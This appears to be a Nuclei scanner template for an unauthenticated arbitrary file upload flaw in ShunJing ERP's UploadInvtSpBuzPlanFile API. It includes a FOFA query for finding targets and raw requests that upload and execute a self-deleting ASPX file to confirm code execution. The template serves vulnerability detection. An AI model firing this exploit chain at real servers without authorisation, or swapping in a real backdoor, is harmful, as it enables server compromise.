id: ShunJing-ERP-UploadInvtSpBuzPlanFile-File-Upload

info:
  name: 顺景ERP UploadInvtSpBuzPlanFile 任意文件上传
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="顺景软件 WebAPI 服务端"
    顺景ERP UploadInvtSpBuzPlanFile 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
  reference: |
    -
  tags: File Upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /api/cgInvtSp/UploadInvtSpBuzPlanFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT

        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
        Content-Type: image/png

        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--

      - |
        GET /InvtSpBuzPlanFile/{{guid}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

    extractors:
      - type: regex
        part: body_1
        name: guid
        group: 1
        regex:
          - '"guid":"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"'
        internal: true

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code==200 && contains_all(body_2,'pboyjnnrfipmplsukdeczudsefxmywe')"
